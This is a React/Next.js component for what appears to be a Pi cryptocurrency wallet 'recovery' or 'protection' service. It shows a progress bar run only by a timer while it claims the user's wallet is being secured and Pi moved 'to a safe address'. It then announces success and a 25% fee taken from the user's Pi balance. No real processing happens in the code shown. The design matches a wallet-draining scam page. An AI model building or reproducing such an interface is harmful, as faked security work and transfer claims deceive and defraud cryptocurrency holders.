"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "./ui/card"
import { ArrowRight, CheckCircle, Info, Loader2, RefreshCw } from "lucide-react"
import { Progress } from "./ui/progress"
import { Alert, AlertDescription, AlertTitle } from "./ui/alert"
import { Button } from "./ui/button"
import { useRouter } from "next/navigation"

const RecoverSuccess = ({ isProtection }: { isProtection: string }) => {
  const router = useRouter()
  const [isProcessing, setIsProcessing] = useState(true)
  const [progress, setProgress] = useState(0)

  useEffect(() => {
    if (isProcessing) {
      const interval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + 5
          if (newProgress >= 100) {
            clearInterval(interval)
            setTimeout(() => {
              setIsProcessing(false)
            }, 500)
            return 100
          }
          return newProgress
        })
      }, 500)

      return () => clearInterval(interval)
    }
  }, [isProcessing])

  const handleContinue = () => {
    router.push("/requests")
  }

  return (
    <div className="space-y-4">
      <Card className="shadow-lg">
        <CardHeader>
          <CardTitle>
            {isProcessing
              ? `${isProtection ? "Protection" : "Recovery"} in Progress`
              : isProtection
                ? "Protection Request Received"
                : "Request Received"}
          </CardTitle>
          <CardDescription>
            {isProcessing
              ? `We're ${isProtection ? "securing" : "recovering"} your ${isProtection ? "wallet" : "request"}`
              : isProtection
                ? "Your request to protect your Pi was received"
                : "Your request has been received. You will receive an email notification about your request status."}
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          {isProcessing ? (
            <>
              <div className="flex justify-center py-8">
                <Loader2 className="h-16 w-16 text-primary animate-spin" />
              </div>
              <Progress value={progress} className="h-2" />
              <p className="text-center text-sm text-muted-foreground">
                {isProtection
                  ? "Securing your wallet and transferring Pi to a safe address..."
                  : "Processing your request..."}
              </p>
            </>
          ) : (
            <div className="space-y-6">
              <div className="flex justify-center py-4">
                <CheckCircle className="h-16 w-16 text-green-500" />
              </div>
              <Alert className="bg-green-50 dark:bg-green-950 border-green-200 dark:border-green-900">
                <CheckCircle className="h-4 w-4 text-green-500" />
                <AlertTitle>Success</AlertTitle>
                <AlertDescription>
                  {isProtection
                    ? "Your protection request has been received. You will get confirmation once protection is set."
                    : "Your request has been received. You will receive an email notification about your request status."}
                </AlertDescription>
              </Alert>

              <Alert>
                <Info className="h-4 w-4" />
                <AlertTitle>Fee Information</AlertTitle>
                <AlertDescription>
                  Please note that a 25% service fee will be deducted from your Pi balance upon completion of the operation. If no fee applies, you will be notified accordingly.
                </AlertDescription>
              </Alert>
            </div>
          )}
        </CardContent>
        <CardFooter className="flex gap-2">
          {!isProcessing ? (
            <Button onClick={handleContinue} className="w-full">
              Check Status
              <ArrowRight className="ml-2 h-4 w-4" />
            </Button>
          ) : (
            <Button disabled className="w-full">
              Processing...
              <Loader2 className="ml-2 h-4 w-4 animate-spin" />
            </Button>
          )}
          {/* {!isProcessing && (
            <Button variant="outline" onClick={handleReset} className="flex-shrink-0">
              <RefreshCw className="h-4 w-4" />
            </Button>
          )} */}
        </CardFooter>
      </Card>
    </div>
  )
}

export default RecoverSuccess
